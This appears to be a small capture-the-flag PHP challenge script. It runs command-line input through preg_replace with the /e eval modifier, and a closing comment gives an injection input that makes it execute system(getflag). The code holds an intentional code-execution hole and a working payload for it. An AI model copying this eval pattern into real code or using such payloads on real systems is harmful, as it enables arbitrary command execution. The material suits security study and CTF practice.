#!/usr/bin/php
<?php

function y($m)
{
    print("y: $m\n");
    return $m;
}

function x($a, $z)
{
    print("$a\n");
    $a = @preg_replace("/(\[x (.*)\])/e", "y(\"\") \\2 y(\"\")", $a);
    print("$a\n");
    return $a;
}

$r = x($argv[1], $argv[2]);
print "$r\n";
?>

// php /tmp/ntm.php '[x || system(getflag) ||]' ntmpd